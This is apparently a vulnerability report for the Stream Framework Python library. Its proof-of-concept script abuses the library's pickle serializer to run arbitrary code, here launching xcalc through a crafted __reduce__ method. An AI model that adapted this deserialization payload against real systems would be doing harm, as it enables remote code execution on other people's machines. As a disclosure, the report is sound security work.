# Description
Stream Framework is a Python library, which allows you to build news feed, activity streams and notification systems using Cassandra and/or Redis. The authors of Stream-Framework also provide a cloud service for feed technology
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install stream-framework')
from stream_framework.serializers import pickle_serializer
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
pickle_serializer.PickleSerializer.loads(dumps,dumps)
```
* `pip3 install stream-framework`
* `python3 exploit.py`
